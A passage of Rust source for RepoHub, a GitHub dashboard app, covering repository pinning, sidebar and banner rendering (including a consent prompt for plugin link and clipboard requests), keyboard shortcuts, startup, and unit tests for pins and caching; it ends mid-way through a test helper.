    fn toggle_pin(&mut self, i: usize) {
        let Some(full) = self.data.repos.get(i).map(|r| r.full_name.clone()) else { return };
        let mut list: Vec<String> = match &self.pins {
            Some(p) => p.clone(),
            None => pinned(self).into_iter().map(|j| self.data.repos[j].full_name.clone()).collect(),
        };
        let name = self.data.repos[i].name.clone();
        if let Some(at) = list.iter().position(|p| p.eq_ignore_ascii_case(&full)) {
            list.remove(at);
            self.notify(format!("Unpinned {name}"));
        } else {
            list.push(full);
            self.notify(format!("Pinned {name}"));
        }
        prefs::save_pins(&list);
        self.pins = Some(list);
        self.sync_tray();
    }

    /// Shows the Repositories page for `owner`.
    fn show_owner(&mut self, owner: OwnerFilter) {
        state::trace("owner", &self.owner, &owner);
        self.owner = owner;
        self.go(Page::Repos);
    }
}

/// The pinned repositories: the names in REPOHUB_PINNED, else the three most recently pushed.
pub(crate) fn pinned(s: &App) -> Vec<usize> {
    let repos = &s.data.repos;
    // Pins chosen in the app win; a repository that's no longer loaded is skipped.
    if let Some(pins) = &s.pins {
        return pins.iter().filter_map(|p| repos.iter().position(|r| r.full_name.eq_ignore_ascii_case(p))).collect();
    }
    if s.cfg.pinned.is_empty() {
        return (0..repos.len().min(3)).collect();
    }
    s.cfg.pinned.iter().filter_map(|p| repos.iter().position(|r| r.name.eq_ignore_ascii_case(p) || r.full_name.eq_ignore_ascii_case(p))).collect()
}

fn sidebar(s: &App, k: &Kit) -> El {
    let prs_capped = s.data.prs_capped();
    let issues_capped = s.data.issues_capped();
    let open_prs = s.data.pulls.iter().filter(|p| matches!(p.state, PullState::Open | PullState::Draft)).count();
    let brand = row().w_full().h(40.0).px(10.0).gap(10.0).center_y()
        .child(row().size(26.0, 26.0).radius(7.0).center().fill(k.c.text_strong)
            .child(ui::ico(&icons::REPO, 15.0, k.c.page)))
        .child(text(s.cfg.title.clone()).font(k.ty.body_medium).color(k.c.text_strong));
    let pinned: Vec<El> = pinned(s).into_iter().map(|i| {
        let r = &s.data.repos[i];
        let full = r.full_name.clone();
        SidebarRow::new(r.name.clone()).avatar(ui::avatar(k, &r.name, r.hue, 16.0)).height(30.0)
            .selected(matches!(&s.page, Page::Repo(f) if f.eq_ignore_ascii_case(&full))).on_select(move |s: &mut App, _| s.open(i)).build(k).key(format!("pin-{}", r.full_name))
    }).collect();
    let org_rows: Vec<El> = orgs(s).into_iter().map(|(o, n)| {
        let on = s.page == Page::Repos && s.owner == OwnerFilter::Org(o.clone());
        let pick = o.clone();
        SidebarRow::new(o.clone()).avatar(ui::avatar(k, &o, 210.0, 16.0)).height(30.0).badge(n.to_string())
            .selected(on).on_select(move |s: &mut App, _| s.show_owner(OwnerFilter::Org(pick.clone()))).build(k).key(format!("org-{o}"))
    }).collect();
    let mut sb = Sidebar::new()
        .label("Navigation")
        .header(brand)
        .header(nav(s, k, "Overview", &icons::HOME, Page::Overview, None))
        .header(nav(s, k, "Repositories", &icons::REPO, Page::Repos, (!s.data.repos.is_empty()).then(|| s.data.repos.len().to_string())))
        .header(nav(s, k, "Pull requests", &icons::PULL, Page::Pulls, (open_prs > 0 || prs_capped).then(|| model::capped_if(open_prs, prs_capped))))
        .header(nav(s, k, "Issues", &icons::ISSUE, Page::Issues, (!s.data.issues.is_empty() || issues_capped).then(|| model::capped_if(s.data.issues.len(), issues_capped))))
        .header(nav(s, k, "Actions", &icons::PLAY, Page::Actions, None))
        .header(nav(s, k, "Notifications", &icons::BELL, Page::Notifications, Some(s.unread()).filter(|n| *n > 0).map(|n| if n >= 50 { "50+".to_owned() } else { n.to_string() })))
        .section(SidebarSection::new("Pinned").count(pinned.len()).collapsed(!s.pinned_open)
            .on_toggle(|s: &mut App, _| s.pinned_open = !s.pinned_open).rows(pinned));
    if !org_rows.is_empty() {
        sb = sb.section(SidebarSection::new("Organizations").count(org_rows.len()).collapsed(s.orgs_closed)
            .on_toggle(|s: &mut App, _| s.orgs_closed = !s.orgs_closed).rows(org_rows));
    }
    let plugin_rows: Vec<El> = s.plugins.pages().into_iter().map(|(id, label)| {
        let pid = id.clone();
        SidebarRow::new(label.clone()).icon(&icons::SPARK).height(30.0).selected(matches!(&s.page, Page::Plugin(p) if p == &pid))
            .on_select(move |s: &mut App, _| s.go(Page::Plugin(pid.clone()))).build(k).key(format!("plugin-page-{id}"))
    }).collect();
    if !plugin_rows.is_empty() {
        sb = sb.section(SidebarSection::new("Plugins").count(plugin_rows.len()).rows(plugin_rows));
    }
    sb.footer(nav(s, k, "Settings", &icons::GEAR, Page::Settings, None)).build(k)
}

fn title(s: &App) -> String {
    match &s.page {
        Page::Overview => "Overview".into(),
        Page::Repos => "Repositories".into(),
        Page::Repo(full) => full.replace('/', " / "),
        Page::Pulls => "Pull requests".into(),
        Page::Issues => "Issues".into(),
        Page::Actions => "Actions".into(),
        Page::Notifications => "Notifications".into(),
        Page::Settings => "Settings".into(),
        Page::Plugin(id) => s.plugins.list.iter().find(|p| p.id == *id).and_then(|p| p.manifest.page.clone()).unwrap_or_default(),
    }
}

/// A banner when a new version is ready, or while it downloads.
/// A plugin's request to open a link or copy text, with the buttons that answer it.
fn plugin_ask_banner(s: &App, k: &Kit) -> Option<El> {
    use rune_kit::{Button, ButtonVariant};
    let request = s.plugin_ask.as_ref()?;
    let short = |t: &str, n: usize| if t.chars().count() > n { format!("{}…", t.chars().take(n).collect::<String>()) } else { t.to_owned() };
    let (title, detail, yes) = match &request.ask {
        plugins::Ask::Open(url) => (
            format!("The plugin {} wants to open a page on {}", request.plugin, plugins::host(url).unwrap_or("another site")),
            format!("{}\nThe address can carry what the plugin can see here (names of your repositories, issues and pull requests).", short(url, 300)),
            "Open",
        ),
        plugins::Ask::Copy(text) => (
            format!("The plugin {} wants to copy this to the clipboard", request.plugin),
            short(text, 300),
            "Copy",
        ),
    };
    let tint = k.c.warning.icon;
    Some(col().w_full().px(14.0).py(10.0).gap(8.0).radius(k.radius.lg).key("plugin-ask").role("alert")
        .fill(tint.alpha(0.12)).border(1.0, tint.alpha(0.45))
        .child(text(title).font(k.ty.small_medium).color(k.c.text_strong).wrap())
        .child(text(detail).font(k.ty.mono).color(k.c.text_base).wrap())
        .child(row().gap(8.0)
            .child(Button::new("Don't").variant(ButtonVariant::Ghost).control_size(ControlSize::Small)
                .on_press_tx(|s: &mut App, tx| s.answer_plugin(false, tx)).build(k).key("plugin-ask-no"))
            .child(Button::new(yes).control_size(ControlSize::Small)
                .on_press_tx(|s: &mut App, tx| s.answer_plugin(true, tx)).build(k).key("plugin-ask-yes"))))
}

fn update_banner(s: &App, k: &Kit) -> Option<El> {
    use rune_kit::{Button, ButtonVariant};
    let (msg, actions) = match &s.update {
        update::Update::Available(r) if !s.update_later => (
            format!("A new version of RepoHub is ready (built {} from {}).", model::ago(r.published, s.now.max(r.published)), r.short()),
            true,
        ),
        update::Update::Downloading { percent, .. } => (format!("Downloading the new version… {percent}%"), false),
        update::Update::Installing => ("Installing the new version; RepoHub restarts in a moment.".into(), false),
        _ => return None,
    };
    let tint = k.c.success.icon;
    let mut r = row().w_full().px(14.0).py(10.0).gap(10.0).center_y().radius(k.radius.lg).key("update-banner")
        .fill(tint.alpha(0.12)).border(1.0, tint.alpha(0.45))
        .child(ui::ico(&icons::REFRESH, 15.0, tint))
        .child(text(msg).font(k.ty.small).color(k.c.text_base).wrap().grow(1.0).shrink());
    let notes = s.update.available().map(|r| r.notes.clone()).filter(|n| actions && !n.is_empty());
    if notes.is_some() {
        r = r.child(Button::new(if s.show_notes { "Hide what's new" } else { "What's new" }).variant(ButtonVariant::Ghost).control_size(ControlSize::Small)
            .on_press(|s: &mut App| s.show_notes = !s.show_notes).build(k).key("update-notes"));
    }
    if actions {
        r = r.child(Button::new("Later").variant(ButtonVariant::Ghost).control_size(ControlSize::Small)
                .on_press(|s: &mut App| s.update_later = true).build(k).key("update-later"))
            .child(Button::new("Install and restart").variant(ButtonVariant::Submit).control_size(ControlSize::Small)
                .on_press(|s: &mut App| s.install_update()).build(k).key("update-install"));
    } else if matches!(s.update, update::Update::Downloading { .. }) {
        r = r.child(Button::new("Cancel").variant(ButtonVariant::Ghost).control_size(ControlSize::Small)
            .on_press(|s: &mut App| s.cancel_update()).build(k).key("update-cancel"));
    }
    match notes {
        Some(md) if s.show_notes => Some(col().w_full().gap(0.0).radius(k.radius.lg).fill(tint.alpha(0.06)).border(1.0, tint.alpha(0.45)).key("update-banner-box")
            .child(r.radius(0.0).fill(Color::TRANSPARENT).border(0.0, Color::TRANSPARENT))
            .child(col().w_full().px(16.0).pb(12.0).key("update-notes-body").child(pages::readme_view(k, &md)))),
        _ => Some(r),
    }
}

/// Whether the current page already shows `Status::Failed` in place of its empty list.
fn list_shows_failed(s: &App) -> bool {
    s.data.is_empty() && match &s.page {
        Page::Overview | Page::Repos | Page::Repo(_) | Page::Pulls | Page::Issues | Page::Actions => true,
        Page::Plugin(id) => !s.plugins.list.iter().any(|p| p.id == *id && p.running()),
        Page::Settings | Page::Notifications => false,
    }
}

/// A banner above the page for loading, errors and sample data.
fn banner(s: &App, k: &Kit) -> Option<El> {
    let (msg, tint, action) = match &s.status {
        Status::Starting | Status::Loading => ("Loading data from GitHub…".to_owned(), k.c.info.icon, false),
        Status::Failed(_) if list_shows_failed(s) => return None,
        Status::Failed(e) => (e.clone(), k.c.danger.icon, true),
        Status::Ready if !s.data.warnings.is_empty() => (s.data.warnings.join(" · "), k.c.warning.icon, true),
        Status::Sample if !s.cfg.demo && !s.cfg.account_locked => ("This is sample data. Connect your GitHub account to see your repositories.".to_owned(), k.c.warning.icon, false),
        Status::Sample if !s.cfg.demo => ("Sample data. To see your repositories, create a .env file with GITHUB_USER or GITHUB_TOKEN (see .env.example) and run RepoHub with Docker or as the desktop app.".to_owned(), k.c.warning.icon, false),
        _ => return None,
    };
    let connect = s.status == Status::Sample && !s.cfg.account_locked && !s.cfg.demo && s.page != Page::Settings;
    let icon = if s.status == Status::Ready && !s.data.warnings.is_empty() {
        &icons::BELL
    } else if action {
        &icons::CROSS
    } else {
        &icons::BELL
    };
    let mut r = row().w_full().px(14.0).py(10.0).gap(10.0).center_y().radius(k.radius.lg)
        .fill(tint.alpha(0.12)).border(1.0, tint.alpha(0.45))
        .child(ui::ico(icon, 15.0, tint))
        .child(text(msg).font(k.ty.small).color(k.c.text_base).wrap().grow(1.0).shrink());
    if action {
        r = r.child(rune_kit::Button::new("Retry").control_size(ControlSize::Small).on_press(|s: &mut App| s.refresh()).build(k).key("retry"));
    }
    if connect {
        r = r.child(rune_kit::Button::new("Connect").variant(rune_kit::ButtonVariant::Submit).control_size(ControlSize::Small)
            .on_press(|s: &mut App| { s.settings_section = state::SettingsSection::Account; s.go(Page::Settings); }).build(k).key("connect"));
    }
    Some(r.key("banner"))
}

fn view(s: &App, cx: &mut Cx<App>) -> El {
    let system_dark = cx.system_dark();
    let dark = s.theme.is_dark(system_dark);
    let look = s.looks.active(dark);
    let k = themes::kit(look);
    s.shown_dark.set(dark);
    s.plugins.set_colors(&k);
    let content = match (&s.thread, &s.page) {
        (Some(t), _) => thread_page::view(s, &k, t),
        (None, page) => match page {
        Page::Overview => pages::overview(s, &k),
        Page::Repos => pages::repos(s, &k),
        Page::Repo(full) => {
            if let Some(i) = s.repo_index_of(full) {
                let extra = s.plugin_tab.as_deref().and_then(|p| s.plugins.surface(p, cx, "repo"));
                pages::repo_detail(s, &k, i, extra)
            } else {
                pages::repos(s, &k)
            }
        }
        Page::Plugin(id) => s.plugins.surface(id, cx, "page").unwrap_or_else(|| pages::overview(s, &k)),
        Page::Pulls => lists::pulls(s, &k),
        Page::Issues => lists::issues(s, &k),
        Page::Actions => lists::actions(s, &k),
        Page::Notifications => inbox::page(s, &k),
        Page::Settings => lists::settings(s, &k),
        },
    };
    let mut inner = col().w_full().max_w(1080.0).gap(16.0);
    if let Some(b) = update_banner(s, &k) {
        inner = inner.child(b);
    }
    if let Some(b) = plugin_ask_banner(s, &k) {
        inner = inner.child(b);
    }
    if let Some(b) = banner(s, &k) {
        inner = inner.child(b);
    }
    let pad = if s.compact { 12.0 } else { 24.0 };
    let page = col().w_full().padding(pad).gap(16.0).items_center().child(inner.child(content));
    let picture = match (&s.images, look.backdrop) {
        (Some(cache), themes::Backdrop::Image) if !look.image.trim().is_empty() => {
            let src = look.image.trim();
            let img = if src.starts_with("http://") || src.starts_with("https://") { cache.url(src, 0.0, cx.env().scale) } else { cache.file(src, 0.0, cx.env().scale) };
            Some(img.pixels().clone())
        }
        _ => None,
    };
    let backdrop = themes::backdrop(look, s.backdrop_size, picture.as_ref()).key("backdrop")
        .on_layout_tx(|s: &mut App, [_, _, w, h], _| {
            let size = [w, h];
            if (size[0] / 64.0).ceil() != (s.backdrop_size[0] / 64.0).ceil() || (size[1] / 64.0).ceil() != (s.backdrop_size[1] / 64.0).ceil() {
                s.backdrop_size = size;
            }
        });
    let mut main = col().w_full().h_full().shrink().fill(k.c.page).clip_rounded(0.0)
        .child(backdrop)
        .child(col().key("page").w_full().h_full().shrink().scroll(ScrollSpec { stick_bottom: false }).child(page));
    // The toast floats over the page, at the bottom; it leaves by itself or with its button.
    if let Some(toast) = &s.toast {
        let (icon, tint) = match toast.kind {
            ToastKind::Done => (&icons::CHECK, k.c.success.icon),
            ToastKind::Problem => (&icons::CROSS, k.c.danger.icon),
        };
        let close = IconButton::new(&icons::CROSS).variant(IconButtonVariant::GhostMuted).label("Dismiss")
            .on_press(|s: &mut App| s.toast = None).build(&k).key("toast-close");
        main = main.child(row().pin(Some(16.0), None, Some(16.0), Some(20.0)).center()
            .child(row().key("toast").gap(10.0).pl(14.0).pr(6.0).py(6.0).center_y().max_w(560.0).radius(k.radius.lg)
                .fill(k.c.bg_base).border(1.0, if toast.kind == ToastKind::Problem { tint.alpha(0.6) } else { k.c.border_base })
                .role(if toast.kind == ToastKind::Problem { "alert" } else { "status" })
                .child(ui::ico(icon, 14.0, tint))
                .child(text(toast.text.clone()).font(k.ty.small).color(k.c.text_base).wrap().shrink())
                .children(toast.undo.is_some().then(|| rune_kit::Button::new("Undo").variant(rune_kit::ButtonVariant::Ghost).control_size(ControlSize::Small)
                    .on_press(|s: &mut App| s.undo()).build(&k).key("toast-undo")))
                .child(close)));
    }
    let (theme_icon, theme_help) = if dark { (&icons::SUN, "Switch to the light theme") } else { (&icons::MOON, "Switch to the dark theme") };
    let theme = IconButton::new(theme_icon).variant(IconButtonVariant::GhostMuted).label(theme_help)
        .help(theme_help).on_press(move |s: &mut App| s.set_theme(s.theme.toggled(system_dark))).build(&k).key("theme");
    let mut trailing = row().gap(4.0).center_y();
    if s.cfg.live() {
        trailing = trailing.child(IconButton::new(&icons::REFRESH).variant(IconButtonVariant::GhostMuted).label("Refresh")
            .help(match s.freshness() { Some(f) => format!("Refresh from GitHub · {}", f.to_lowercase()), None => "Refresh from GitHub".into() })
            .disabled(s.status.is_busy()).on_press(|s: &mut App| s.refresh()).build(&k).key("refresh"));
    }
    let search = IconButton::new(k.glyph.search).variant(IconButtonVariant::GhostMuted).label("Search and commands")
        .help(format!("Search and commands ({}+K)", palette::MOD)).on_press(|s: &mut App| s.palette = Some(palette::Palette::new()))
        .build(&k).key("open-palette");
    let trailing = row().gap(4.0).center_y().child(search).child(trailing);
    let who = if s.data.profile.login.is_empty() { "?".to_owned() } else { s.data.profile.login.clone() };
    let profile_url = format!("https://github.com/{who}");
    let profile = ui::user(&k, &who, 26.0).ml(6.0).role("button").label("Your profile on GitHub").key("profile")
        .on_press_tx(move |_: &mut App, tx| { let _ = tx.open_url(&profile_url); });
    // On a phone an open board takes the whole screen.
    let phone_board = match (&s.page, &s.board) {
        (Page::Repo(full), Some(b)) if s.compact && s.editing_board() && b.repo == *full => s.repo_index_of(full).map(|i| (i, b)),
        _ => None,
    };
    let root = if let Some((i, b)) = phone_board {
        notes_page::phone_editor(&k, i, b, cx.safe_area())
    } else if s.compact {
        let settings = IconButton::new(&icons::GEAR).variant(IconButtonVariant::GhostMuted).label("Settings")
            .expanded(s.page == Page::Settings).on_press(|s: &mut App| s.go(Page::Settings)).build(&k).key("open-settings");
        let name = match &s.page {
            Page::Repo(full) => s.repo_index_of(full).and_then(|i| s.data.repos.get(i)).map(|r| r.name.clone()).unwrap_or_else(|| full.clone()),
            _ => title(s),
        };
        // The phone has no sidebar: the bell is the way to the notifications.
        let unread = s.unread();
        let bell = IconButton::new(&icons::BELL).variant(if unread > 0 { IconButtonVariant::Contrast } else { IconButtonVariant::GhostMuted })
            .label(if unread > 0 { format!("Notifications, {unread} unread") } else { "Notifications".to_owned() })
            .expanded(s.page == Page::Notifications).on_press(|s: &mut App| s.go(Page::Notifications)).build(&k).key("open-notifications");
        mobile::shell(s, &k, cx.safe_area(), name, trailing.child(bell).child(theme).child(settings), main.grow(1.0).min_h(0.0))
    } else {
        let toolbar = Toolbar::new().title(title(s)).trailing(trailing
            .child(theme)
            .child(profile));
        SplitView::new(main)
            .sidebar(&s.sidebar, |s: &mut App| &mut s.sidebar, sidebar(s, &k))
            .toolbar(toolbar)
            .titlebar_inset(cx.titlebar_inset())
            .sidebar_toggle(SidebarToggle::new().size(ControlSize::Large))
            .reduced_motion(cx.is_reduced_motion())
            .build(&k)
    };
    let overlays = palette::layer(s, &k);
    let root = root.on_paste(|s: &mut App, text: &str, _| {
            s.paste(text);
        })
        // The window's width picks the layout: phone-sized windows get the one in `mobile`.
        .on_layout_tx(|s: &mut App, [_, _, w, _], _| {
            let compact = w < mobile::BREAKPOINT;
            if s.compact != compact {
                s.compact = compact;
            }
            // A phone shows diffs unified (see `changes_page`), whatever was picked when wide.
            if compact {
                for d in [&mut s.diff, &mut s.pull_diff] {
                    if d.mode() != rune_kit::diff::DiffMode::Unified {
                        d.set_mode(rune_kit::diff::DiffMode::Unified);
                    }
                }
            }
        });
    // Overlays (the command palette) go above the whole window.
    rune_kit::root(root, overlays)
}

/// With the window: the image decoder for backgrounds.
fn setup(s: &mut App, waker: rune::Waker) {
    #[cfg(not(target_arch = "wasm32"))]
    s.plugins.set_waker(waker.clone());
    s.images = Some(rune::ImageCache::new(waker));
}

/// The layout to start with, before the first frame is measured (avoids a flash on phones).
fn starts_compact() -> bool {
    #[cfg(target_arch = "wasm32")]
    {
        js_sys::Reflect::get(&js_sys::global(), &"innerWidth".into()).ok().and_then(|v| v.as_f64()).is_some_and(|w| (w as f32) < mobile::BREAKPOINT)
    }
    #[cfg(not(target_arch = "wasm32"))]
    {
        std::env::var("REPOHUB_COMPACT").is_ok_and(|v| v == "1")
    }
}

/// Runs at the start of every frame with Rune's clock: ticks every 30 seconds (`App::tick`) and
/// asks Rune to wake for the next one, also while the window is closed. No timer thread.
fn poll(s: &mut App, clock: f64, tx: &mut Tx) -> bool {
    const EVERY: f64 = 30.0;
    #[cfg(not(target_arch = "wasm32"))]
    let plugins_ran = {
        if s.plugins.list.iter().any(|p| p.running()) {
            // The context is rebuilt only when what it shows may have changed.
            let key = plugins::context_key(s, s.shown_dark.get());
            if s.plugin_ctx_key != key {
                s.plugin_ctx_key = key;
                let ctx = plugins::context(s, s.shown_dark.get());
                s.plugins.set_context(ctx);
            }
        }
        s.plugins.poll(clock, tx)
    };
    #[cfg(target_arch = "wasm32")]
    let plugins_ran = false;
    s.clock = clock;
    let due = clock - s.tick_at >= EVERY;
    if due {
        s.tick_at = clock;
        s.tick();
    }
    tx.wake_after(std::time::Duration::from_secs_f64((EVERY - (clock - s.tick_at)).max(1.0)));
    due || plugins_ran
}

/// The window closed: RepoHub stays in the status bar, unless its icon couldn't be shown.
fn on_close(s: &mut App, tx: &mut Tx) {
    #[cfg(not(target_arch = "wasm32"))]
    if s.tray.is_none() {
        tx.quit();
    }
    #[cfg(target_arch = "wasm32")]
    let _ = (s, tx);
}

fn on_key(s: &mut App, ev: &KeyEvent, _: &mut Tx) -> bool {
    // The board editor's shortcuts, unless the text tool's field is taking the keys.
    // They apply only while the editor is on screen: an open drawing left behind on another
    // page must not swallow Delete or ⌘Z there.
    if s.editing_board()
        && let Some(b) = s.board.as_mut()
        && !b.is_typing()
    {
        let changed = match &ev.key {
            rune::Key::Delete | rune::Key::Backspace => b.delete_selected(),
            rune::Key::Escape => {
                b.deselect();
                return true;
            }
            _ if ev.is_command('z') && ev.mods.shift => b.redo(),
            _ if ev.is_command('z') => b.undo(),
            _ if ev.is_command('y') => b.redo(),
            _ => return shortcuts(s, ev),
        };
        if changed {
            s.save_board();
        }
        return true;
    }
    shortcuts(s, ev)
}

fn shortcuts(s: &mut App, ev: &KeyEvent) -> bool {
    if shell::is_sidebar_toggle(ev) {
        s.sidebar.toggle();
        return true;
    }
    if ev.is_command('r') {
        s.refresh();
        return true;
    }
    if ev.is_command('k') {
        s.palette = if s.palette.is_some() { None } else { Some(palette::Palette::new()) };
        return true;
    }
    // ⌘/Ctrl+[ goes back: out of a conversation, or from a repository to the list.
    if ev.is_command('[') {
        if s.thread.is_some() {
            s.close_pull_diff();
            s.thread = None;
        } else if matches!(s.page, Page::Repo(_)) {
            s.go(Page::Repos);
        } else {
            return false;
        }
        return true;
    }
    // Esc closes what's open on top of the page, the most recent first.
    if ev.key == rune::Key::Escape && ev.mods == rune::Mods::default() {
        if s.confirm_merge.is_some() {
            s.confirm_merge = None;
        } else if s.form.is_some() {
            s.form = None;
        } else if s.pull_diff_of.is_some() {
            s.close_pull_diff();
        } else if s.thread.is_some() {
            s.thread = None;
        } else if s.local_file.is_some() {
            s.local_file = None;
        } else if s.toast.is_some() {
            s.toast = None;
        } else {
            return false;
        }
        return true;
    }
    // ⌘/Ctrl+1…5 jump to the main pages, ⌘/Ctrl+, to Settings.
    for (c, page) in [('1', Page::Overview), ('2', Page::Repos), ('3', Page::Pulls), ('4', Page::Issues), ('5', Page::Actions), (',', Page::Settings)] {
        if ev.is_command(c) {
            s.go(page);
            return true;
        }
    }
    false
}

/// Inter for the interface and IBM Plex Mono for code and the terminal (both SIL OFL, see
/// `assets/fonts`). The mono slot prefers the system's monospaced font (SF Mono on macOS).
const FONTS: &[&[u8]] = &[
    include_bytes!("../assets/fonts/Inter-Regular.ttf"),
    include_bytes!("../assets/fonts/Inter-Medium.ttf"),
    include_bytes!("../assets/fonts/Inter-SemiBold.ttf"),
    include_bytes!("../assets/fonts/IBMPlexMono-Regular.ttf"),
];
const FAMILIES: (&str, &str) = ("Inter", "ui-monospace, IBM Plex Mono");

#[cfg(target_arch = "wasm32")]
thread_local! {
    /// The running app, for [`repohub_back`].
    static BACK: std::cell::RefCell<Option<AppHandle<App>>> = const { std::cell::RefCell::new(None) };
}

/// The Android app calls this when the back button is pressed.
#[cfg(target_arch = "wasm32")]
#[wasm_bindgen::prelude::wasm_bindgen]
pub fn repohub_back() {
    BACK.with(|b| {
        if let Some(h) = b.borrow().as_ref() {
            h.update(|s: &mut App, _| s.back());
        }
    });
}

#[cfg_attr(target_arch = "wasm32", wasm_bindgen::prelude::wasm_bindgen(start))]
pub fn start() {
    let mut app = rune::App::new(AppSpec { on_key: Some(on_key), poll: Some(poll), setup: Some(setup), fonts: FONTS, families: FAMILIES, ..AppSpec::new("RepoHub", (1180.0, 760.0), init, view) });
    // With the status-bar widget, closing the window keeps RepoHub there (macOS, Windows).
    if tray::keeps_running() {
        app = app.keep_running().on_close(on_close);
    }
    let app = app.on_quit(|s: &mut App, _| s.save_layout());
    let handle = app.handle();
    let h2 = handle.clone();
    handle.update(move |s: &mut App, _| {
        s.handle = Some(h2.clone());
        s.start_tray();
        #[cfg(not(target_arch = "wasm32"))]
        s.plugins.start(&h2);
        // Clear what an earlier update left, then look for a newer build.
        #[cfg(not(target_arch = "wasm32"))]
        update::cleanup();
        s.check_update(false);
        #[cfg(not(target_arch = "wasm32"))]
        if s.status == Status::Starting {
            s.refresh(); // the first load, when the app starts with an account
        }
        // The web build asks repohub-server for its configuration; a static host (GitHub Pages)
        // has none, and then shows the sample data.
        #[cfg(target_arch = "wasm32")]
        net::spawn(h2.clone(), || net::fetch_config(), |s: &mut App, cfg| {
            let live = cfg.as_ref().is_some_and(|c| c.live());
            // The phone app has a configuration before it has an account.
            if let Some(cfg) = cfg.filter(|c| live || c.device) {
                if live && prefs::load_theme().is_none() {
                    s.theme = cfg.theme;
                }
                s.acct_user = TextEdit::new(cfg.user.clone().unwrap_or_default());
                s.cfg = Arc::new(cfg);
            }
            if live {
                s.refresh();
            } else {
                s.data = Data::sample();
                s.set_status(Status::Sample);
            }
        });
        #[cfg(target_arch = "wasm32")]
        BACK.with(|b| *b.borrow_mut() = Some(h2.clone()));
    });
    app.run();
}

#[cfg(test)]
mod pin_tests {
    #[test]
    fn the_first_pin_keeps_the_default_ones() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let dir = std::env::temp_dir().join(format!("repohub-pins-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        // SAFETY: the lock keeps other environment-changing tests out.
        unsafe { std::env::set_var("REPOHUB_DATA_DIR", &dir) };
        let mut s = crate::init();
        s.data = crate::model::Data::sample();
        s.pins = None;
        let mut cfg = (*s.cfg).clone();
        cfg.pinned.clear();
        s.cfg = std::sync::Arc::new(cfg);
        assert_eq!(crate::pinned(&s), vec![0, 1, 2], "by default the three most recently pushed");
        s.toggle_pin(4);
        assert_eq!(crate::pinned(&s), vec![0, 1, 2, 4], "pinning one more keeps them");
        s.toggle_pin(1);
        assert_eq!(crate::pinned(&s), vec![0, 2, 4]);
        assert!(s.is_pinned(4) && !s.is_pinned(1));
        let saved = crate::prefs::load_pins().unwrap();
        assert_eq!(saved.len(), 3);
        assert!(saved[2].eq_ignore_ascii_case(&s.data.repos[4].full_name), "remembered by full name");
        let _ = std::fs::remove_dir_all(dir);
    }
}

#[cfg(test)]
mod cache_tests {
    use crate::state::Load;

    #[test]
    fn a_refresh_keeps_details_of_repositories_nobody_pushed_to() {
        let _env = crate::ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let mut s = crate::init();
        s.data = crate::model::Data::sample_at(1_700_000_000);
        let (a, b) = (s.data.repos[0].full_name.clone(), s.data.repos[1].full_name.clone());
        for full in [&a, &b] {
            s.details.insert((full.clone(), "main".into()), Load::Ready(crate::model::Detail::default()));
        }
        s.details.insert(("gone/repo".into(), "main".into()), Load::Ready(crate::model::Detail::default()));
        let mut next = crate::model::Data::sample_at(1_700_000_000);
        next.repos[1].pushed += 60;
        let epoch = s.load_gen;
        s.apply(epoch, Ok(next));
        assert!(s.details.contains_key(&(a, "main".into())), "not pushed since: kept");
        assert!(!s.details.contains_key(&(b, "main".into())), "pushed since: loaded again");
        assert!(!s.details.contains_key(&("gone/repo".into(), "main".into())));
    }
}

#[cfg(test)]
mod load_gen_tests {
    use crate::model::{Data, Detail, Profile, PullState, Repo};
    use crate::state::{Compose, Layout, Load, OwnerFilter, Place, RepoFilter, RepoSort, RepoTab, Status, Submit};

    #[cfg(not(target_arch = "wasm32"))]
    pub(crate) struct TempDataDir {
        dir: std::path::PathBuf,
        prev: Option<std::ffi::OsString>,
    }

    #[cfg(not(target_arch = "wasm32"))]
    impl TempDataDir {
        pub(crate) fn new(tag: &str) -> Self {
            let dir = std::env::temp_dir().join(format!("repohub-{tag}-{}", std::process::id()));
            let _ = std::fs::remove_dir_all(&dir);
            let prev = std::env::var_os("REPOHUB_DATA_DIR");
            // SAFETY: ENV_LOCK serializes tests mutating environment variables.
            unsafe { std::env::set_var("REPOHUB_DATA_DIR", &dir) };
            Self { dir, prev }
        }
    }

    #[cfg(not(target_arch = "wasm32"))]
    impl Drop for TempDataDir {
        fn drop(&mut self) {
            // SAFETY: ENV_LOCK is still held while TempDataDir drops inside each test.
            unsafe {
                match &self.prev {
                    Some(v) => std::env::set_var("REPOHUB_DATA_DIR", v),
                    None => std::env::remove_var("REPOHUB_DATA_DIR"),
                }
            }
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }

    fn account_data(login: &str, repo_name: &str, private: bool) -> Data {
        Data {
            profile: Profile { login: login.into(), name: login.into(), bio: String::new() },
            repos: vec![Repo {
                owner: login.into(),
                name: repo_name.into(),
                full_name: format!("{login}/{repo_name}"),
                language: "Rust".into(),
                stars: 1,
                branch: "main".into(),
                private,
                pushed: 1_700_000_000,
                hue: 210.0,
                url: format!("https://github.com/{login}/{repo_name}"),
                ..Repo::default()
            }],
            ..Data::default()
        }
    }

    fn seed_caches(s: &mut crate::App, owner: &str) {
        let full = format!("{owner}/secret");
        s.details.insert((full.clone(), "main".into()), Load::Ready(Detail::default()));
        s.branches.insert(full.clone(), Load::Ready(vec!["main".into()]));
        s.branch_of.insert(full.clone(), "dev".into());
        s.notes.entry((full.clone(), "main".into())).or_default().state = crate::state::Refresh::Fresh;
        s.diff_of = Some(crate::diffs::DiffOf::Local(full.clone()));
        s.diff_load = Some(Load::Ready(()));
        s.pull_diff_of = Some((full.clone(), 42));
        s.pull_diff_load = Some(Load::Ready(()));
        s.filter = RepoFilter::Private;
        s.pr_filter = PullState::Merged;
        s.owner = OwnerFilter::Org(owner.into());
        s.search = rune::TextEdit::new("secret");
        s.branch_filter = rune::TextEdit::new("dev");
        s.chats.entry(full.clone()).or_default().session = Some("sess-1".into());
        s.claude_prompt = rune::TextEdit::new("ask");
        s.clone_path = rune::TextEdit::new("/tmp/secret");
        s.busy.insert(format!("{full}#42"));
        s.form = Some(crate::actions::Form {
            repo: full.clone(),
            kind: Compose::Issue,
            title: rune::TextEdit::new("Draft"),
            body: rune::TextEdit::new(""),
            from: "main".into(),
            into: "main".into(),
            draft: false,
            submit: Submit::Editing,
        });
        crate::prefs::set("place", Place { page: "repo".into(), tab: Some(RepoTab::Notes), repo: Some(full) }.to_json());
